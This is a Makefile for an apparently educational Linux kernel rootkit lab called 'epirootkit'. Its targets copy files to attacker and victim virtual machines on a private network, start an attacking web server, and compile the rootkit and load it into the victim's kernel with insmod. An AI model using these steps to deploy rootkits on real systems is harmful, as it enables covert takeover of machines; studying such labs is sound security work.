ROOT_DIR := $(shell pwd)
BOOT_DIR := $(ROOT_DIR)/boot
ATTACKER_DIR := $(ROOT_DIR)/attacker
ROOTKIT_DIR := $(ROOT_DIR)/rootkit

all: prepare start doc

prepare:
	@echo "Preparing the environment..."
	@cd $(BOOT_DIR)
	@chmod +x $(BOOT_DIR)/1__setup.sh
	@sudo $(BOOT_DIR)/1__setup.sh $(BOOT_DIR)

start:
	@cd $(BOOT_DIR)
	@chmod +x $(BOOT_DIR)/2__launch.sh
	@$(BOOT_DIR)/2__launch.sh $(BOOT_DIR)

update_attacker:
	@echo "Updating attacker files..."
	@echo "Copying repository 'attacker' to the attacker machine..."
	@scp -r $(ATTACKER_DIR)/ attacker@192.168.100.2:/home/attacker/
	@echo "All files copied successfully."

launch_attacker:
	@echo "Launching attacking web server..."
	ssh attacker@192.168.100.2 'exec sudo -S python3 ~/attacker/main.py'

update_victim:
	@echo "Updating victim files..."
	@echo "Copying repository 'rootkit' to the victim machine..."
	@scp -r $(ROOTKIT_DIR)/ victim@192.168.100.3:/home/victim/
	@echo "All files copied successfully."

launch_victim:
	@echo "Compiling and insmod rootkit on the victim machine..."
	ssh victim@192.168.100.3 'cd ~/rootkit && sudo -S sh -c "make -j 8 -f Makefile && insmod epirootkit.ko"'

launch_debug_victim:
	@echo "Compiling and insmod rootkit on the victim machine..."
	ssh victim@192.168.100.3 'cd ~/rootkit && sudo -S sh -c "make -j 8 -f Makefile debug && insmod epirootkit.ko"'

stop_epirootkit:
	@echo "Trying to rmmod epirootkit... (available only if rootkit has been launched in debug mode)"
	ssh victim@192.168.100.3 'sudo -S rmmod epirootkit'

doc:
	@echo "Generating documentation..."
	@cd $(ROOT_DIR)/docs && doxygen Doxyfile > /dev/null 2>&1
	@echo "Documentation generated successfully."
	@echo "You can find the documentation in the 'docs/html' directory."
	@echo "To view the documentation, open 'file://$(ROOT_DIR)/docs/html/index.html' in your web browser."

clean:
	@echo "Cleaning up..."
	@echo "Removing generated documentation..."
	@rm -rf $(ROOT_DIR)/docs/html
	@echo "Cleaning network interfaces..."
	@cd $(BOOT_DIR)
	@chmod +x $(BOOT_DIR)/3__clean.sh
	@$(BOOT_DIR)/3__clean.sh $(BOOT_DIR)
	@echo "Cleanup completed."
	
.PHONY: prepare start update_attacker launch_attacker update_victim launch_victim launch_debug_victim stop_epirootkit doc clean